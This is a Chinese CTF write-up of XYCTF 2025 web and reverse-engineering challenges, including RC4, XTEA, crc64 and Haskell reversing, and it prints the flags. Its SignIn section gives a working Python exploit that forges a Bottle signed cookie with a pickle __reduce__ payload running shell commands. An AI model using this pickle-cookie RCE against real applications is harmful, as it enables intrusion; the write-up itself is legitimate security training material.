---
title: XYCTF 2025 WP
date: 2025-04-07 20:00:45
tags: [cry,web,re,pwn,misc]
categories: wp
typora-root-url: ./..
---

# XYCTF 2025

**排名：1**

## Web

### ez_puzzle

查看js源码，找到_3KH_函数判断输出flag的地方

```python
if (G > yw4) {
      alert(O[s74](J74))
    } else {
      alert($vfeRha_calc(S74 + G / Rw4, Y74, $v5sNVR(vS4)))
    }
```

运行到此处即可

![](/images/image-1744626745337-3.png)

### SignIn

访问/secret 获得cookie 

疑似Bottle 框架的 signed cookie

signed cookie 构造

`!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=`是 base 64 编码的   HMAC - SHA 1 签名

`gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu`是 base64 编码的 Python 数据，反序列化后应该是

也就是说第二端可以通过pickle 序列化攻击实现 rce

```python
from bottle import SimpleCookie
import base64
import hmac
import hashlib
import pickle

def make_signed_cookie(secret, data):
    pickled = pickle.dumps(data)
    digest = hmac.new(secret.encode(), pickled, hashlib.sha1).digest()
    cookie = '!' + base64.b64encode(digest).decode() + '?' + base64.b64encode(pickled).decode()
    return cookie

# 假设你已经拿到 secret 内容：
secret = ""  # ← 替换成实际值
data = {"name": "admin"}
signed_cookie = make_signed_cookie(secret, data)
print("伪造的 Cookie 值：", signed_cookie)
```

通过/download 读取 签名

![](/images/image-20250406194123399-1744626745337-4.png)

```vbnet
Hell0_H@cker_Y0u_A3r_Sm@r7
```

```python
from bottle import SimpleCookie
import base64
import hmac
import hashlib
import pickle

def make_signed_cookie(secret, data):
    pickled = pickle.dumps(data)
    digest = hmac.new(secret.encode(), pickled, hashlib.sha1).digest()
    cookie = '!' + base64.b64encode(digest).decode() + '?' + base64.b64encode(pickled).decode()
    return cookie

secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"  
class Data(object):
    def __reduce__(self):
         
        return (eval, ("__import__('os').popen('cat /flag*>/test.txt').read()",))
data = Data()
encoded = base64.b64encode(pickle.dumps(data, -1))
print(encoded)
signed_cookie = make_signed_cookie(secret, data)
print("伪造的 Cookie 值：", signed_cookie)
```

伪造cookie成功后再通过download 路由实现任意文件读取

![](/images/image-20250406200423921-1744626745337-5.png)





## Reverse

### WARMUP

网上抄的VBS解密代码

```vbscript
Function Defuscator(vbs)
    Dim t
    t = InStr(1, vbs, "Execute", 1)
    t = Mid(vbs, t + Len("Execute"))
    t = Eval(t)
    Defuscator = t
End Function

Dim fso, i, outFile
Const ForReading = 1, ForWriting = 2
Set fso = CreateObject("Scripting.FileSystemObject")

    ' 创建或打开一个文件用于写入输出
    Set outFile = fso.OpenTextFile("output.txt", ForWriting, True)

        For i = 0 To WScript.Arguments.Count - 1
        Dim FileName
        FileName = WScript.Arguments(i)
        Dim MyFile
        Set MyFile = fso.OpenTextFile(FileName, ForReading)
            Dim vbs
            vbs = MyFile.ReadAll
            outFile.WriteLine Defuscator(vbs)
            MyFile.Close
        Next

        outFile.Close
        Set fso = Nothing
```

output.txt:

```vbscript
MsgBox "Dear CTFER. Have fun in XYCTF 2025!"
flag = InputBox("Enter the FLAG:", "XYCTF")
wefbuwiue = "90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4" ' 棰勮鐨凴C4鍔犲瘑缁撴灉锛堝崄鍏繘鍒舵牸寮忥級
qwfe = "rc4key"

' 淇鍚庣殑RC4鍔犲瘑鍑芥暟
Function RunRC(sMessage, strKey)
    Dim kLen, i, j, temp, pos, outHex
    Dim s(255), k(255)
    
    ' 鍒濆鍖栧瘑閽?
    kLen = Len(strKey)
    For i = 0 To 255
        s(i) = i
        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) ' 瀵嗛挜浣跨敤ASCII缂栫爜
    Next
    
    ' KSA瀵嗛挜璋冨害
    j = 0
    For i = 0 To 255
        j = (j + s(i) + k(i)) Mod 256
        temp = s(i)
        s(i) = s(j)
        s(j) = temp
    Next
    
    ' PRGA鍔犲瘑娴佺▼
    i = 0 : j = 0 : outHex = ""
    For pos = 1 To Len(sMessage)
        i = (i + 1) Mod 256
        j = (j + s(i)) Mod 256
        temp = s(i)
        s(i) = s(j)
        s(j) = temp
        
        ' 鍔犲瘑骞惰浆涓哄崄鍏繘鍒?
        Dim plainChar, cipherByte
        plainChar = Asc(Mid(sMessage, pos, 1)) ' 鏄庢枃鎸堿SCII澶勭悊
        cipherByte = s((s(i) + s(j)) Mod 256) Xor plainChar
        outHex = outHex & Right("0" & Hex(cipherByte), 2)
    Next
    
    RunRC = outHex
End Function

' 涓婚獙璇侀€昏緫
If LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) Then
    MsgBox "Congratulations! Correct FLAG!"
Else
    MsgBox "Wrong flag."
End If



```

RC4解密，密钥为**rc4key**

![](/images/1-1744626745337-7.png)

flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn's_chall_is_r3@lly_gr3@t_&_fuN!}

### ezVM

通过字符串界面里的unicorn和加密函数的一些特征发现是使用了unicorn框架调用了一串代码。

找一个使用unicorn框架的程序进行bindiff恢复一些unicorn函数的符号。

发现是调用了一串ARM64的代码字节进行模拟执行，将输入字符串传入加密返回，并附上了一些data和栈空间初始化。

![](/images/2-1744626745337-6.png)

![](/images/4-1744626745337-8.png)

将以上调用write写入的数据提取，随便找一个ARM64框架的.so复制到对应地址，以便反编译看代码。

最后得到一个函数，很清晰的看出里面是一个VM虚拟机执行的流程。

![](/images/5-1744626745337-10.png)

使用c++编写代码调用unicorn库进行模拟。

使用Hook，在关键计算地址处进行Hook，输出各个计算流程以及数据。

```cpp
#include <iostream>
#include <Windows.h>
#include <string>
#include <vector>
#include <iostream>
#include "data.hpp"
#include "unicorn/unicorn.h"
#pragma comment(lib,"unicorn-import.lib")

static void hook_code(uc_engine* uc, uint64_t address, uint32_t size, void* user_data) {
    uint64_t w0,w1,w2,w3,w4;

    if (address == 0x1fac) 
    {
        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);
        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);

        printf("W3 = W1 ^ W0 --- %llx ^ %llx = %llx\n", w1,w0,w1^w0);
    }
    if (address == 0x2BE4)
    {
        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);
        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);

        printf("W3 = W1 >> W0 --- %llx >> %llx = %llx\n", w1, w0, w1 >> w0);
    }
    if (address == 0x2DB4)
    {
        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);
        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);

        printf("W3 = W1 << W0 --- %llx << %llx = %llx\n", w1, w0, w1 << w0);
    }
    if (address == 0x232C)
    {
        uc_reg_read(uc, UC_ARM64_REG_W3, &w3);
        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);

        printf("W2 = W0 & W3 --- %llx & %llx = %llx\n", w0, w3, w0 & w3);
    }
    if (address == 0x2054)
    {
        uc_reg_read(uc, UC_ARM64_REG_W3, &w3);
        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);

        printf("W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n", w0, w3, w3 ^ w0);
    }
    if (address == 0x2238)
    {
        uc_reg_read(uc, UC_ARM64_REG_W3, &w3);
        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);

        printf("W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n", w0, w3, w3 ^ w0);
    }
    if (address == 0x2180)
    {
        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);
        uc_reg_read(uc, UC_ARM64_REG_W4, &w4);

        printf("W1 = W1 ^ W4 --- %llx ^ %llx = %llx\n", w1, w4, w1 ^ w4);
    }
    if (address == 0x1CC4)
    {
        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);
        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);
        printf("W2 = W1 + W0 --- %llx + %llx = %llx\n", w1, w0, w1 + w0);
    }
    if (address == 0x1A0C)
    {
        uc_reg_read(uc, UC_ARM64_REG_W0, &w0);
        uc_reg_read(uc, UC_ARM64_REG_W1, &w1);
        printf("W2 = W1 + W0 --- %llx + %llx = %llx\n", w1, w0, w1 + w0);
    }
}

int main()
{
    uint8_t Input[] = "11112222111111111111111111111111";
    uc_engine* uc{};
    uc_hook hook;
    uint64_t InputAddr = 0x14C28;
    uint64_t Stack = 0x7F0000;
    uint8_t MyEncFlag[100]{};
    uint64_t Base = 0x0000000001000000;
    uc_open(uc_arch::UC_ARCH_ARM64, uc_mode::UC_MODE_ARM, &uc);
    uc_mem_map(uc, 0, Base, UC_PROT_ALL);
    uc_mem_map(uc, Stack - 4096, 0x4000, UC_PROT_ALL);
    uc_hook_add(uc, &hook, UC_HOOK_CODE, hook_code, NULL, 1, 0);
    uc_mem_write(uc, 0x14C28, (LPVOID)&Input, 0x20u);
    uc_mem_write(uc, 0x0C70, (LPVOID)&Code, 8840u);
    uc_mem_write(uc, 0x14010, (LPVOID)Data1, 0x9B8u);
    uc_mem_write(uc, 0x30F0, (LPVOID)&Data2, 0x54u);
    uc_mem_write(uc, 0x149E8, (LPVOID)&Data3, 8u);
    uc_reg_write(uc, 0xC7, (LPVOID)&InputAddr);// X0
    uc_reg_write(uc, 4, (LPVOID)&Stack);       // SP
    if (!uc_emu_start(uc, 0x0C70, 0x2EF4, 0, 0))
    {
        uc_mem_read(uc, InputAddr, &MyEncFlag, 48);
    }
    for (int i = 0; i < 32; i++)
    {
        printf("%X ", MyEncFlag[i]);
    }
    uc_close(uc);
	return 0;
}
```

最后运行输出得到一个vm加密流程

以下是部分输出内容。

output:

```cpp
W3 = W1 << W0 --- 4 << 0 = 4
W3 = W1 << W0 --- 4 << 1 = 8
W3 = W1 >> W0 --- 32323232 >> 5 = 1919191
W3 = W1 << W0 --- 32323232 << 6 = c8c8c8c80
W3 = W1 ^ W0 --- 1919191 ^ 8c8c8c80 = 8d1d1d11
W2 = W0 ^ W3 --- 32323232 ^ 11223344 = 23100176
W2 = W1 + W0 --- 8d1d1d11 + 23100176 = b02d1e87
W2 = W0 & W3 --- 0 & 3 = 0
W2 = W1 + W0 --- 776f6853 + 0 = 776f6853
W2 = W0 ^ W3 --- 776f6853 ^ abab1212 = dcc47a41
W3 = W1 ^ W0 --- b02d1e87 ^ dcc47a41 = 6ce964c6
W2 = W1 + W0 --- 6ce964c6 + 31313131 = 9e1a95f7
W3 = W1 >> W0 --- 9e1a95f7 >> 4 = 9e1a95f
W3 = W1 << W0 --- 9e1a95f7 << 7 = 4f0d4afb80
W3 = W1 ^ W0 --- 9e1a95f ^ d4afb80 = 4ab52df
W2 = W0 ^ W3 --- 9e1a95f7 ^ 55667788 = cb7ce27f
W2 = W1 + W0 --- 4ab52df + cb7ce27f = d028355e
W3 = W1 >> W0 --- 5f5fe6e7 >> b = bebfc
W2 = W0 & W3 --- bebfc & 3 = 0
W2 = W1 + W0 --- 776f6853 + 5f5fe6e7 = d6cf4f3a
W2 = W0 ^ W3 --- d6cf4f3a ^ 23235566 = f5ec1a5c
W3 = W1 ^ W0 --- f5ec1a5c ^ d028355e = 25c42f02
W2 = W1 + W0 --- 25c42f02 + 32323232 = 57f66134
W3 = W1 >> W0 --- 57f66134 >> 5 = 2bfb309
W3 = W1 << W0 --- 57f66134 << 6 = 15fd984d00
W3 = W1 ^ W0 --- 2bfb309 ^ fd984d00 = ff27fe09
W2 = W0 ^ W3 --- 57f66134 ^ 11223344 = 46d45270
W2 = W1 + W0 --- ff27fe09 + 46d45270 = 145fc5079
W2 = W0 & W3 --- 5f5fe6e7 & 3 = 3
W2 = W1 + W0 --- 74696564 + 5f5fe6e7 = d3c94c4b
W2 = W0 ^ W3 --- d3c94c4b ^ abab1212 = 78625e59
W3 = W1 ^ W0 --- 45fc5079 ^ 78625e59 = 3d9e0e20
W2 = W1 + W0 --- 3d9e0e20 + 9e1a95f7 = dbb8a417
W3 = W1 >> W0 --- dbb8a417 >> 4 = dbb8a41
W3 = W1 << W0 --- dbb8a417 << 7 = 6ddc520b80
W3 = W1 ^ W0 --- dbb8a41 ^ dc520b80 = d1e981c1
W2 = W0 ^ W3 --- dbb8a417 ^ 55667788 = 8eded39f
W2 = W1 + W0 --- d1e981c1 + 8eded39f = 160c85560
W3 = W1 >> W0 --- bebfcdce >> b = 17d7f9
W2 = W0 & W3 --- 17d7f9 & 3 = 1
W2 = W1 + W0 --- 656b616d + bebfcdce = 1242b2f3b
W2 = W0 ^ W3 --- 242b2f3b ^ 23235566 = 7087a5d
W3 = W1 ^ W0 --- 7087a5d ^ 60c85560 = 67c02f3d
W2 = W1 + W0 --- 67c02f3d + 57f66134 = bfb69071
W3 = W1 >> W0 --- bfb69071 >> 5 = 5fdb483
W3 = W1 << W0 --- bfb69071 << 6 = 2feda41c40
W3 = W1 ^ W0 --- 5fdb483 ^ eda41c40 = e859a8c3
W2 = W0 ^ W3 --- bfb69071 ^ 11223344 = ae94a335
W2 = W1 + W0 --- e859a8c3 + ae94a335 = 196ee4bf8
W2 = W0 & W3 --- bebfcdce & 3 = 2
W2 = W1 + W0 --- 616d5f72 + bebfcdce = 1202d2d40
W2 = W0 ^ W3 --- 202d2d40 ^ abab1212 = 8b863f52
W3 = W1 ^ W0 --- 96ee4bf8 ^ 8b863f52 = 1d6874aa
W2 = W1 + W0 --- 1d6874aa + dbb8a417 = f92118c1
W3 = W1 >> W0 --- f92118c1 >> 4 = f92118c
W3 = W1 << W0 --- f92118c1 << 7 = 7c908c6080
W3 = W1 ^ W0 --- f92118c ^ 908c6080 = 9f1e710c
W2 = W0 ^ W3 --- f92118c1 ^ 55667788 = ac476f49
W2 = W1 + W0 --- 9f1e710c + ac476f49 = 14b65e055
W3 = W1 >> W0 --- 1e1fb4b5 >> b = 3c3f6
W2 = W0 & W3 --- 3c3f6 & 3 = 2
W2 = W1 + W0 --- 616d5f72 + 1e1fb4b5 = 7f8d1427
W2 = W0 ^ W3 --- 7f8d1427 ^ 23235566 = 5cae4141
W3 = W1 ^ W0 --- 5cae4141 ^ 4b65e055 = 17cba114
W2 = W1 + W0 --- 17cba114 + bfb69071 = d7823185
W3 = W1 >> W0 --- d7823185 >> 5 = 6bc118c
W3 = W1 << W0 --- d7823185 << 6 = 35e08c6140
W3 = W1 ^ W0 --- 6bc118c ^ e08c6140 = e63070cc
W2 = W0 ^ W3 --- d7823185 ^ 11223344 = c6a002c1
W2 = W1 + W0 --- e63070cc + c6a002c1 = 1acd0738d
W2 = W0 & W3 --- 1e1fb4b5 & 3 = 1
W2 = W1 + W0 --- 656b616d + 1e1fb4b5 = 838b1622
W2 = W0 ^ W3 --- 838b1622 ^ abab1212 = 28200430
W3 = W1 ^ W0 --- acd0738d ^ 28200430 = 84f077bd
W2 = W1 + W0 --- 84f077bd + f92118c1 = 17e11907e
W3 = W1 >> W0 --- 7e11907e >> 4 = 7e11907
W3 = W1 << W0 --- 7e11907e << 7 = 3f08c83f00
W3 = W1 ^ W0 --- 7e11907 ^ 8c83f00 = f292607
W2 = W0 ^ W3 --- 7e11907e ^ 55667788 = 2b77e7f6
W2 = W1 + W0 --- f292607 + 2b77e7f6 = 3aa10dfd
W3 = W1 >> W0 --- 7d7f9b9c >> b = faff3
W2 = W0 & W3 --- faff3 & 3 = 3
W2 = W1 + W0 --- 74696564 + 7d7f9b9c = f1e90100
W2 = W0 ^ W3 --- f1e90100 ^ 23235566 = d2ca5466
W3 = W1 ^ W0 --- d2ca5466 ^ 3aa10dfd = e86b599b
W2 = W1 + W0 --- e86b599b + d7823185 = 1bfed8b20
W3 = W1 >> W0 --- bfed8b20 >> 5 = 5ff6c59
W3 = W1 << W0 --- bfed8b20 << 6 = 2ffb62c800
W3 = W1 ^ W0 --- 5ff6c59 ^ fb62c800 = fe9da459
W2 = W0 ^ W3 --- bfed8b20 ^ 11223344 = aecfb864
W2 = W1 + W0 --- fe9da459 + aecfb864 = 1ad6d5cbd
W2 = W0 & W3 --- 7d7f9b9c & 3 = 0
W2 = W1 + W0 --- 776f6853 + 7d7f9b9c = f4ef03ef
W2 = W0 ^ W3 --- f4ef03ef ^ abab1212 = 5f4411fd
W3 = W1 ^ W0 --- ad6d5cbd ^ 5f4411fd = f2294d40
W2 = W1 + W0 --- f2294d40 + 7e11907e = 1703addbe
W3 = W1 >> W0 --- 703addbe >> 4 = 703addb
W3 = W1 << W0 --- 703addbe << 7 = 381d6edf00
W3 = W1 ^ W0 --- 703addb ^ 1d6edf00 = 1a6d72db
W2 = W0 ^ W3 --- 703addbe ^ 55667788 = 255caa36
W2 = W1 + W0 --- 1a6d72db + 255caa36 = 3fca1d11
W3 = W1 >> W0 --- dcdf8283 >> b = 1b9bf0
W2 = W0 & W3 --- 1b9bf0 & 3 = 0
W2 = W1 + W0 --- 776f6853 + dcdf8283 = 1544eead6
W2 = W0 ^ W3 --- 544eead6 ^ 23235566 = 776dbfb0
W3 = W1 ^ W0 --- 776dbfb0 ^ 3fca1d11 = 48a7a2a1
W2 = W1 + W0 --- 48a7a2a1 + bfed8b20 = 108952dc1
W3 = W1 >> W0 --- 8952dc1 >> 5 = 44a96e
W3 = W1 << W0 --- 8952dc1 << 6 = 2254b7040
W3 = W1 ^ W0 --- 44a96e ^ 254b7040 = 250fd92e
W2 = W0 ^ W3 --- 8952dc1 ^ 11223344 = 19b71e85
W2 = W1 + W0 --- 250fd92e + 19b71e85 = 3ec6f7b3
W2 = W0 & W3 --- dcdf8283 & 3 = 3
W2 = W1 + W0 --- 74696564 + dcdf8283 = 15148e7e7
W2 = W0 ^ W3 --- 5148e7e7 ^ abab1212 = fae3f5f5
W3 = W1 ^ W0 --- 3ec6f7b3 ^ fae3f5f5 = c4250246
W2 = W1 + W0 --- c4250246 + 703addbe = 1345fe004
W3 = W1 >> W0 --- 345fe004 >> 4 = 345fe00
W3 = W1 << W0 --- 345fe004 << 7 = 1a2ff00200
W3 = W1 ^ W0 --- 345fe00 ^ 2ff00200 = 2cb5fc00
W2 = W0 ^ W3 --- 345fe004 ^ 55667788 = 6139978c
W2 = W1 + W0 --- 2cb5fc00 + 6139978c = 8def938c
W3 = W1 >> W0 --- 3c3f696a >> b = 787ed
W2 = W0 & W3 --- 787ed & 3 = 1
W2 = W1 + W0 --- 656b616d + 3c3f696a = a1aacad7
W2 = W0 ^ W3 --- a1aacad7 ^ 23235566 = 82899fb1
W3 = W1 ^ W0 --- 82899fb1 ^ 8def938c = f660c3d
W2 = W1 + W0 --- f660c3d + 8952dc1 = 17fb39fe
W3 = W1 >> W0 --- 17fb39fe >> 5 = bfd9cf
W3 = W1 << W0 --- 17fb39fe << 6 = 5fece7f80
W3 = W1 ^ W0 --- bfd9cf ^ fece7f80 = fe71a64f
W2 = W0 ^ W3 --- 17fb39fe ^ 11223344 = 6d90aba
W2 = W1 + W0 --- fe71a64f + 6d90aba = 1054ab109
W2 = W0 & W3 --- 3c3f696a & 3 = 2
W2 = W1 + W0 --- 616d5f72 + 3c3f696a = 9dacc8dc
W2 = W0 ^ W3 --- 9dacc8dc ^ abab1212 = 3607dace
W3 = W1 ^ W0 --- 54ab109 ^ 3607dace = 334d6bc7
W2 = W1 + W0 --- 334d6bc7 + 345fe004 = 67ad4bcb
W3 = W1 >> W0 --- 67ad4bcb >> 4 = 67ad4bc
W3 = W1 << W0 --- 67ad4bcb << 7 = 33d6a5e580
W3 = W1 ^ W0 --- 67ad4bc ^ d6a5e580 = d0df313c
W2 = W0 ^ W3 --- 67ad4bcb ^ 55667788 = 32cb3c43
W2 = W1 + W0 --- d0df313c + 32cb3c43 = 103aa6d7f
W3 = W1 >> W0 --- 9b9f5051 >> b = 1373ea
W2 = W0 & W3 --- 1373ea & 3 = 2
W2 = W1 + W0 --- 616d5f72 + 9b9f5051 = fd0cafc3
W2 = W0 ^ W3 --- fd0cafc3 ^ 23235566 = de2ffaa5
W3 = W1 ^ W0 --- de2ffaa5 ^ 3aa6d7f = dd8597da
W2 = W1 + W0 --- dd8597da + 17fb39fe = f580d1d8
W3 = W1 >> W0 --- f580d1d8 >> 5 = 7ac068e
W3 = W1 << W0 --- f580d1d8 << 6 = 3d60347600
W3 = W1 ^ W0 --- 7ac068e ^ 60347600 = 6798708e
W2 = W0 ^ W3 --- f580d1d8 ^ 11223344 = e4a2e29c
W2 = W1 + W0 --- 6798708e + e4a2e29c = 14c3b532a
W2 = W0 & W3 --- 9b9f5051 & 3 = 1
W2 = W1 + W0 --- 656b616d + 9b9f5051 = 1010ab1be
W2 = W0 ^ W3 --- 10ab1be ^ abab1212 = aaa1a3ac
W3 = W1 ^ W0 --- 4c3b532a ^ aaa1a3ac = e69af086
W2 = W1 + W0 --- e69af086 + 67ad4bcb = 14e483c51
W3 = W1 >> W0 --- 4e483c51 >> 4 = 4e483c5
W3 = W1 << W0 --- 4e483c51 << 7 = 27241e2880
W3 = W1 ^ W0 --- 4e483c5 ^ 241e2880 = 20faab45
W2 = W0 ^ W3 --- 4e483c51 ^ 55667788 = 1b2e4bd9
W2 = W1 + W0 --- 20faab45 + 1b2e4bd9 = 3c28f71e
W3 = W1 >> W0 --- faff3738 >> b = 1f5fe6
W2 = W0 & W3 --- 1f5fe6 & 3 = 2
W2 = W1 + W0 --- 616d5f72 + faff3738 = 15c6c96aa
W2 = W0 ^ W3 --- 5c6c96aa ^ 23235566 = 7f4fc3cc
W3 = W1 ^ W0 --- 7f4fc3cc ^ 3c28f71e = 436734d2
W2 = W1 + W0 --- 436734d2 + f580d1d8 = 138e806aa
```

通过观察可以发现是一个魔改的XTea加密。

通过对比标准XTea加密流程，可以得到里面参与计算的4个key值 **{0x776f6853,0x656b616d,0x616d5f72,0x74696564}** 以及delta值 **0x5f5fe6e7**

写出对应加密的c++代码：

```cpp
void encipher(uint32_t v[2], const uint32_t key[4])
{
    unsigned int i;
    uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x5f5fe6e7;
    for (i = 0; i < 72; i++)
    {
        auto tmp = (((v1 << 6) ^ (v1 >> 5)) + (v1 ^ 0x11223344));
        auto tmp2 = (((key[sum & 3] + sum) ^ 0xabab1212) ^ tmp);
        v0 += tmp2;
        sum += delta;
        auto tmp3 = (((v0 << 7) ^ (v0 >> 4)) + (v0 ^ 0x55667788));
        auto tmp4 = ((key[(sum >> 11) & 3] + sum) ^ 0x23235566 ^ tmp3);
        v1 += tmp4;
    }
    v[0] = v0;
    v[1] = v1;
}
```

解密代码：

```cpp
void decipher(uint32_t v[2], const uint32_t key[4])
{
    unsigned int i;
    uint32_t v0 = v[0], v1 = v[1], sum = 0x5f5fe6e7 * 72, delta = 0x5f5fe6e7;
    for (i = 0; i < 72; i++)
    {
        auto tmp3 = (((v0 << 7) ^ (v0 >> 4)) + (v0 ^ 0x55667788));
        auto tmp4 = ((key[(sum >> 11) & 3] + sum) ^ 0x23235566 ^ tmp3);
        v1 -= tmp4;
        sum -= delta;
        auto tmp = (((v1 << 6) ^ (v1 >> 5)) + (v1 ^ 0x11223344));
        auto tmp2 = (((key[sum & 3] + sum) ^ 0xabab1212) ^ tmp);
        v0 -= tmp2;
    }
    v[0] = v0;
    v[1] = v1;
}
```

提取chal程序中的密文，进行解密即可。

完整解密代码：

```cpp
#include <iostream>

void decipher(uint32_t v[2], const uint32_t key[4])
{
    unsigned int i;
    uint32_t v0 = v[0], v1 = v[1], sum = 0x5f5fe6e7 * 72, delta = 0x5f5fe6e7;
    for (i = 0; i < 72; i++)
    {
        auto tmp3 = (((v0 << 7) ^ (v0 >> 4)) + (v0 ^ 0x55667788));
        auto tmp4 = ((key[(sum >> 11) & 3] + sum) ^ 0x23235566 ^ tmp3);
        v1 -= tmp4;
        sum -= delta;
        auto tmp = (((v1 << 6) ^ (v1 >> 5)) + (v1 ^ 0x11223344));
        auto tmp2 = (((key[sum & 3] + sum) ^ 0xabab1212) ^ tmp);
        v0 -= tmp2;
    }
    v[0] = v0;
    v[1] = v1;
}

int main()
{
    uint32_t key[]{
        0x776f6853,
        0x656b616d,
        0x616d5f72,
        0x74696564};
    unsigned int Encflag[8] = {
        0x696C2E9A, 0x76ADE8E1, 0xE67D5CA4, 0x5C76BD38,
        0xB7AC0787, 0xBFEA0C65, 0x01C2FF10, 0x6D16FD38};
    decipher(Encflag, key);
    decipher((uint32_t *)((uint64_t)Encflag + 8), key);
    decipher((uint32_t *)((uint64_t)Encflag + 16), key);
    decipher((uint32_t *)((uint64_t)Encflag + 24), key);
    printf("%.32s\n", Encflag);
    return 0;
}
```

XYCTF{fun_un1c0rn_with_4rm64_VM}

### Moon

跟到moon.xor_crypt实际加密处。

![](/images/6-1744626745337-11.png)

发现是进行了单次xor，并加入到一个list中，前后过程不清楚。

断在xor这个命令，运行附加调试，随便输入一串1

![](/images/7-1744626745337-12.png)

![](/images/8-1744626745338-15.png)

发现是输入的'1'和一个0x24进行xor，多运行几次发现就是将输入的字符串都异或上一些值。

直接断在return处，v20是最后将list转成Bytes的结果。

![](/images/9-1744626745338-13.png)

发现是28长度的一串字节，从0x15开始的，就是我们输入字符串长度以及异或完的结果。

![](/images/10-1744626745338-14.png)

继续运行会返回到check_flag代码处，底下有一个RichCompare比较两个数据。

![](/images/11-1744626745338-16.png)

v45可以看到就是将刚刚v20的bytes直接unhex转成了一串字符串。

![](/images/12-1744626745338-18.png)

那么v9就应该是flag的密文，可以数出一共是要35字节。

![](/images/13-1744626745338-17.png)

重新调试运行输入35个1，在check_flag开头断点，把输入的字符串全都patch成0。

![](/images/14-1744626745338-19.png)

![](/images/15-1744626745338-20.png)

![](/images/16-1744626745338-21.png)

最后在RichCompare处就可以得到xor密文的列表。

![](/images/17-1744626745338-22.png)

将v9的密文与这个数据进行xor即可得到flag。

![](/images/18-1744626745338-23.png)

flag{but_y0u_l00k3d_up_@t_th3_mOOn}

### Dragon

.bc 后缀 

反编译为LLVM IR

```python
llvm-dis-17 Dragon.bc -o Dragon.ll
```

分析得知为crc64，以两个为一组进行校验，直接爆破就行

```c++
#include <stdio.h>
#include <stdint.h>
#include <string.h>

uint64_t calculate_crc64_direct(const unsigned char* data, uint64_t length) {
    uint64_t crc = 0xFFFFFFFFFFFFFFFFULL; 

    for (uint64_t i = 0; i < length; i++) {
        crc ^= ((uint64_t)data[i] << 56);

        for (uint64_t j = 0; j < 8; j++) {
            if (crc & 0x8000000000000000ULL) { 
                crc = (crc << 1) ^ 0x42F0E1EBA9EA3693ULL; 
            }
            else {
                crc = crc << 1;
            }
        }
    }

    return ~crc;
}

int main() {
    uint64_t enc[12] = {
       -2565957437423125689, 
        224890624719110086, 
        1357324823849588894, 
        - 8941695979231947288, 
        - 253413330424273460, 
        - 7817463785137710741, 
        - 5620500441869335673, 
        984060876288820705, 
        - 6993555743080142153, 
        - 7892488171899690683, 
        7190415315123037707, 
        - 7218240302740981077
    };
    char flag[25] = { 0 };
    int flag_index = 0;


    for (int k = 0; k < 12; k++) {
        uint64_t target_crc = enc[k];
        int found = 0;
        for (unsigned char c1 = 32; c1 < 127 && !found; c1++) {
            for (unsigned char c2 = 32; c2 < 127 && !found; c2++) {
                unsigned char test[2] = { c1, c2 };
                uint64_t crc = calculate_crc64_direct(test, 2);
                if (crc == target_crc) {
                    flag[flag_index++] = c1;
                    flag[flag_index++] = c2;
                    break;
                }
            }
        }
    }

    flag[flag_index] = '\0';
    printf("Decrypted flag: %s\n", flag);

    return 0;
}
//flag{LLVM_1s_Fun_Ri9h7?}
```

### Summer

haskell程序

函数式编程语言,这意味着一切都是惰性计算，什么是惰性计算？ 简单来说就是在调用之前不会对该值进行计算

浏览 main 函数，可以看到 hs_main 将 ZCMain_main_closure 作为它的参数，它指向 haskell 程序的真正入口点

![](/images/31-1744626745338-24.png)

ZCMain_main_closure里面我们发现它调用了stg_ap_p_fast，这个是底层函数，主要调用Main_main_closure这个函数

![](/images/19-1744626745338-25.png)

GHCziInternalziBase也是底层函数，主要关注两个参数

![](/images/20-1744626745338-26.png)

第一个参数的地址处的函数为打印字符串

![](/images/21-1744626745338-27.png)

![](/images/22-1744626745338-28.png)



GHCziInternalziList_length 为处理我们的传入的字符串的长度，直接调用的是zdwlenAcc**，**zdwlenAcc 将通过检查下一个是否是列表的末尾来计算 "flagTable" 的长度（这里的"flagTable" 是我自己命名,其实就是存储惰性列表，我们可以根据惰性列表的指针数判断字符串的长度）

![](/images/23-1744626745338-29.png)

![](/images/24-1744626745338-30.png)

我们这里就用flag进行测试，一方面是为了查看他的返回值

![](/images/25-1744626745338-31.png)

此时他是将rbx此处(即为惰性列表的末尾)，可以人工数(即为50)

![](/images/26-1744626745338-32.png)

另外一种为看返回值，第一次断下是返回我们输入字符串的长度，第二次断下是返回密钥的长度，第三次断下是返回密文的长度

![](/images/27-1744626745338-33.png)

![](/images/28-1744626745338-34.png)

![](/images/29-1744626745338-35.png)

另外一处为GHCziInternalziNum_zdfNumIntzuzdczp，这个也是在网上一篇文章看到的,在**add     rbx, [rax]** 在经过几次迭代后，我可以看到一些字符开始出现，此时我们可以得到密钥为**Klingsor's_Last_Summer**

![](/images/30-1744626745338-36.png)

我们在.data段得到了密钥，因此我们可以猜测下面可能为密文,并且下面都是指针+元素的存储形式

![](/images/32-1744626745338-37.png)

![](/images/33-1744626745338-38.png)

然后通过CE调试得到明文和密文，然后得出为rc4+xor

![](/images/34-1744626745338-39.png)

![](/images/35-1744626745338-40.png)

flag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}

### Lake

单步跟到主函数。

![](/images/36-1744626745338-41.png)

